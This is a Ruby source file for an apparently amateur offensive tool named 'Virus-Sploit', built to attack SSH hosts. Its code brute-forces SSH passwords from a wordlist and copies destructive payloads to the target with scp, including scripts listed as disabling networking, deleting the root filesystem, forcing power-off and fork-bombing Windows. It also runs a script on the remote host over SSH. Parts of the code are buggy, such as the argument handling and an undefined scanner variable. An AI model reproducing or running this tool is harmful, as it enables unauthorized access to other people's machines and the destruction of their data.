#sudo apt-get install sshfs / easy file sending 
require 'colorize'
require 'net/ssh'
require 'rubygems'
require './waptools.so'

HOST     = ARGV[0] || ''.empty?
USER     = ARGV[1] || ''.empty?
PASSWD   = ARGV[2] || ''.empty? 



def brute(host, user, wordlist)
  icmp = Net::Ping::ICMP.new(host)
  net = 5.times.count do
      icmp.ping
  end

  unless net >= 3
      puts "[-] Con-Low : Aborting...\n\t"
      abort "[-] Connectivity seems low \n\t"
  end
  File.foreach("#{wordlist}").with_index do |line, idx|
      pass = line.chomp
      puts "\033[31m[*] Attackiong Host -> #{host}"
      puts "\033[31m[*] On username     -> #{user}"
      puts "\033[31m[*] With wordlist   -> #{wordlist}"
      print "[*] Trying Password #{pass} on line -> #{idx}\n"
      begin
          result1 = Net::SSH.start(host,
                                  user,
                                  :password => pass,
                                  :auth_methods => ["password"],
                                  :number_of_password_prompts => 0 
                                  )
      rescue Net::SSH::AuthenticationFailed => auth
      else
          abort "Password found #{pass}"
      end
    end
end

class RedRabbitScanner
    def self.Scan(interface)
        WAPTools::Scanner.new interface        
      return scanner.Scan
    end
  end
  
  def main
    while true
      begin
        aps = RedRabbitScanner::Scan "wlan0"
        if aps.length > 0
          aps.each do |ap|
            if ap.nil?
              next
            end
  
            puts "SSID  -> #{ap.ssid}"
            puts "BSSID -> #{ap.bssid}"
            puts "Hertz -> #{ap.frequency}"
          end
        end
      rescue => err
        puts "Failed to scan -> #{err}"
      ensure
        sleep 5
      end
    end
  end
  


def send()
    system("sudo service ssh start ; scp damage-net.sh #{USER}@#{HOST}")
    system("sudo service ssh start ; scp poweroff.sh #{USER}@#{HOST}")
    system("sudo service ssh start ; scp restart.sh #{USER}@#{HOST}")
    system("sudo service ssh start ; scp remove.sh #{USER}@#{HOST}")
    system("sudo service ssh start ; scp annoyed.py #{USER}@#{HOST}")
    system("sudo service ssh start ; scp win-1.bat #{USER}@#{HOST}")
    system("sudo service ssh start ; scp win-2.bat #{USER}@#{HOST}")
    system("sudo service ssh start ; scp fork.sh #{USER}@#{HOST}")
    system("sudo service ssh start ; scp fork.bat #{USER}@#{HOST}")
    puts "[+] Files sent using ssh service ".colorize(:yellow)
end

def attemptcon
    puts "[*] Logging into SSH Server Hpst -> #{HOST}".colorize(:yellow)
    Net::SSH.start(HOST, USER, :password => PASSWD) do |ssh, sucess|
        out = ssh.exec("hostname")
        puts "Hostname -> #{out}".colorize(:green) 
        raise "[!] COULD NOT EXECUTE | SERVER MIGHT BE OFFLINE " unless sucess
    end
end


def exportdisp
    puts "[+] Sending Export file..."
    puts "[+] export-ssh.sh "
    puts "[+] export.bat"
    system("sudo service ssh start ; scp export-ssh.sh #{USER}@#{HOST}")
    system("sudo service ssh start ; scp export.bat #{USER}@#{HOST}")
    puts "[+] Files sent...."
    Net::SSH.start(HOST, USER, :password => PASSWD) do |ssh|
        out = ssh.exec("chmod +x ./export-ssh.sh ; ./export-ssh.sh")
        puts "[?] Executed file? if display ddint work try it in another shell"
        raise "[!] Could not be executed, maybe server is down?"
    end
end


def consol()
    print "\033[32m\033[45mVirus-Sploit@#{USER}>\033[49m\033[39m"
    con = STDIN.gets.chomp
    if con == 'help' or con == 'HELP'
        puts """
        ____________________________________________________________
        |EXIT           -> Exit the script                         |
        |SEND           -> Send all Viruses-Scripts                |
        |SCRIPTS        -> View all the scripts and how to Execute |
        |EXPORT DISPLAY -> Export the ssh display                  |
        |BRUTE          -> Brute force the ssh device 
        |CLEAR          -> Clears YOU'RE display                   |
        |----------------------------------------------------------|
        """.colorize(:blue)
        consol()
    end
    if con == 'brute' or con == 'BRUTE'
      print "\033[31mHost    >>> "
      host     = STDIN.gets.chomp
      print "\033[31mUser    >>> "
      user     = STDIN.gets.chomp
      print "\033[31mWordlist >>> "
      wordlist = STDIN.gets.chomp 
      brute(host, user, wordlist)
    end
    if con == 'export display' or con == 'EXPORT DISPLAY'
        exportdisp()
        consol()
    end
    if con == 'CLEAR' or con == 'clear'
        print"\x1b[H\x1b[2J\x1b[3J"
        bnnr()
        consol()
    end

    if con == 'SCRIPTS' or con == 'scripts' 
        puts """
        _____________________________________________________
        |./damage-net.sh | disable net services             |
        |./restart.sh    | Restart the entire device        |
        |./remove.sh     | Removes the entire root system   | 
        |./poweroff.sh   | Powers device off completely     |
        |annoy.py        | will speak OS FUcked on loop     |
        |----------------WINDOWS----------------------------|
        |fork.bat        | forkbomb for win10               |
        |win-1.bat       | does random things idk win-10    | 
        |win-2.bat       | Constantly spams calc exe on loop|
        |---------------------------------------------------|
        """.colorize(:blue)
        consol()
    end
    if con == 'EXIT' or con == 'exit'
        puts "[*] Exiting....".colorize(:yellow)
        exit!
    end
    if con == 'SEND' or con == 'send'
        puts "[*] Sending the following scripts"
        puts """
        [+] 1 -> ./damage-net.sh
        [+] 2 -> ./restart.sh
        [+] 3 -> ./remove.sh
        [+] 4 -> ./poweroff.sh
        [+] 5 -> annoy.py
        [+] 6 -> fork.bat
        [+] 7 -> win-1.bat
        [+] 8 -> win-2.bat
        """.colorize(:yellow)
        send()
        consol()
    end
end

print"\x1b[H\x1b[2J\x1b[3J"
def bnnr()
    puts <<-'EOF'.colorize(:red)
    
  ██▒   █▓ ██▓ ██▀███   █    ██   ██████   ██████  ██▓███   ██▓     ▒█████   ██▓▄▄▄█████▓
 ▓██░   █▒▓██▒▓██ ▒ ██▒ ██  ▓██▒▒██    ▒ ▒██    ▒ ▓██░  ██▒▓██▒    ▒██▒  ██▒▓██▒▓  ██▒ ▓▒
  ▓██  █▒░▒██▒▓██ ░▄█ ▒▓██  ▒██░░ ▓██▄   ░ ▓██▄   ▓██░ ██▓▒▒██░    ▒██░  ██▒▒██▒▒ ▓██░ ▒░
   ▒██ █░░░██░▒██▀▀█▄  ▓▓█  ░██░  ▒   ██▒  ▒   ██▒▒██▄█▓▒ ▒▒██░    ▒██   ██░░██░░ ▓██▓ ░ 
    ▒▀█░  ░██░░██▓ ▒██▒▒▒█████▓ ▒██████▒▒▒██████▒▒▒██▒ ░  ░░██████▒░ ████▓▒░░██░  ▒██▒ ░ 
    ░ ▐░  ░▓  ░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░▓  ░░ ▒░▒░▒░ ░▓    ▒ ░░   
    ░ ░░   ▒ ░  ░▒ ░ ▒░░░▒░ ░ ░ ░ ░▒  ░ ░░ ░▒  ░ ░░▒ ░     ░ ░ ▒  ░  ░ ▒ ▒░  ▒ ░    ░    
      ░░   ▒ ░  ░░   ░  ░░░ ░ ░ ░  ░  ░  ░  ░  ░  ░░         ░ ░   ░ ░ ░ ▒   ▒ ░  ░      
       ░   ░     ░        ░           ░        ░               ░  ░    ░ ░   ░           
      ░                                                                                  
Posess SSH and fuck over SSH using Virus-Sploit                               Version-2.0 Ruby
─────────────────────────────────────────────────────────────────────────────────────────────                                                
[Help HELP for more info]    
EOF
    puts "\033[36m[\033[35m?\033[36m] Connected to Host > #{HOST}@#{USER}"

end

if ARGV[0].nil?
    bnnr()
puts "EX: ruby #{__FILE__} pi 10.0.0.90 password123roo"
    puts "[-] I need a host and a user "
    exit!
end
if ARGV[1].nil?
    bnnr()
    puts "EX: ruby #{__FILE__} pi 10.0.0.90  Password123 "
    puts "[-] I need a host and a user "
    exit!
end
if ARGV[2].nil? 
    bnnr()
    puts "EX: ruby #{__FILE__} pi 10.0.0.90 Password123 "
    puts "[-] I need a host, user, and a password"
    exit!
end

bnnr()
consol()



